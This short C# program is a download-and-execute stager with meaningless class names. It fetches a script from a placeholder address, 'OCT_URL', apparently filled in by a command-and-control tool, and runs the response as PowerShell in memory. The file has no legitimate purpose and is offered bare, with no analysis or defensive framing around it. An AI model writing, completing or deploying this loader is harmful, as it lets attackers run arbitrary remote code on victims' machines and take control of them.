using System.Management.Automation;
using System.Runtime.InteropServices;
using System.Net;
using System.IO;
using System;

namespace TT3
{
    class TZTZT
    {

    static void Main()
      {

    var request = (HttpWebRequest)WebRequest.Create("OCT_URL");
    var response = (HttpWebResponse)request.GetResponse();
    var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
    PowerShell pp = PowerShell.Create();
	  pp.AddScript(responseString);
	  pp.Invoke();

    }
  }
}
